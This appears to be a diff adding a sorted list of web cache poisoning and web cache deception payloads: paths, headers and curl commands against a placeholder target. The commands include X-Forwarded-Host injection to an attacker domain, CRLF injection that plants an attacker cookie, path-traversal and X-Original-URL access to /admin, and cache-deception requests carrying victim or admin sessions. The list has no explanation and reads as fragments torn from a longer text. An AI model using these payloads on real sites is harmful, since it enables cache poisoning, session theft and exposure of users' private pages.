@@ -1,0 +1,38 @@
+%2F
+/Account
+/Account?cb=x
+/account
+/account/profile
+/account/profile/..%2F..%2Fadmin
+/account/profile/x.css
+/account?cb=x
+/admin
+/api/me
+/dashboard
+/page
+/public-page?cb=...
+?cb=$(uuidgen)
+?param=
+?param=<payload>&utm_source=x
+?param=safe
+?param=safe&param=<payload>
+Accept: text/html
+Content-Type: application/octet-stream
+Content-Type: text/html
+Server: ATS/x.y.z
+Via: ats/x.y.z
+\r\n
+cb=
+curl --resolve target.tld:443:<edge-ip>
+curl -H $'X-Forwarded-Host: evil.tld\r\nSet-Cookie: attacker=1; Path=/' 'https://target/page'
+curl -H 'X-Forwarded-Host: $(python -c "print(\"A\"*8192)")' 'https://target/critical-asset.js?cb=...'
+curl -H 'X-Forwarded-Host: evil.attacker.tld' 'https://target/page?cb=$(uuidgen)'
+curl -H 'X-Forwarded-Scheme: http' 'https://target/login?cb=...'
+curl -H 'X-Original-URL: /admin' 'https://target/public-page?cb=...'
+curl -b "session=ADMIN" 'https://target/public-asset.css/..%2F..%2Fadmin'
+curl -b "session=VICTIM" 'https://target/account/x.css'
+http://target/...
+http://target/login
+https://target/account/x.css
+https://target/critical-asset.js?cb=...
+text/html
